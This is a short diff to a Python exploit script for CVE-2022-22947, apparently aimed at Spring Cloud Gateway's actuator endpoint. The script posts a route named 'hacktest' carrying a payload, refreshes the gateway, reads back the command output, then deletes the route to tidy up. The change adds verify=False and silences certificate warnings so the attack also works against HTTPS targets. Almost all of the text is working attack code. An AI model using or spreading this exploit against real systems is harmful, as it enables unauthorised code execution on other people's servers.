@@ -31,11 +31,12 @@ def CVE_2022_22947(url):
               "order": 0\r
             }'''
 
-    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json)
-    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2)
-    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2)
-    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2)
-    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2)
+    requests.packages.urllib3.disable_warnings()
+    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False)
+    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
+    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
+    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
+    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
     cprint("[+]Payload已经输出，回显结果如下：","magenta")
     print('\n')
     print(re3.text)
